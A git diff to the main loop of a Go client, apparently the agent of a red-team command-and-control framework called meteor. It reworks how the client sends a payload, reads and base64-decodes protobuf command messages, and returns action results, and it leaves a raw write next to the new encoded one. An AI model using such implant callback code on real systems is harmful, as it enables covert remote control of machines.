@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"encoding/base64"
 	"fmt"
 	cUtils "github.com/degenerat3/meteor/meteor/clients/utils"
@@ -62,15 +63,21 @@ func main() {
 		if DEBUG {
 			fmt.Printf("Writing payload to conn...\n")
 		}
-		conn.Write([]byte(payload))
-		data := make([]byte, 16384)
+		fmt.Fprintf(conn, "%s\n", payload)
 		if DEBUG {
 			fmt.Printf("Reading data from conn...\n")
 		}
-		conn.Read(data)
-		decoded, err := base64.StdEncoding.DecodeString(string(data))
+		data, _ := bufio.NewReader(conn).ReadString('\n')
 		if DEBUG {
-			fmt.Printf("Got response: %s\n", decoded)
+			fmt.Printf("Got response: %s\n", data)
+		}
+		decoded, err := base64.StdEncoding.DecodeString(data)
+		if DEBUG {
+			if err != nil {
+				fmt.Println("Error decoding response: " + err.Error())
+				endCheck()
+			}
+			fmt.Printf("Decoded: %s\n", decoded)
 		}
 		resp := &mcs.MCS{}
 		err = proto.Unmarshal(decoded, resp)
@@ -111,6 +118,8 @@ func main() {
 			if DEBUG {
 				fmt.Printf("Writing response data...\n")
 			}
+			encAcnData := cUtils.EncodePayload(acnData)
+			fmt.Fprintf(conn, "%s\n", encAcnData)
 			conn.Write(acnData)
 			acnAck := make([]byte, 512)
 			conn.Read(acnAck) // read the "Add response" status, even tho we don't check it rn
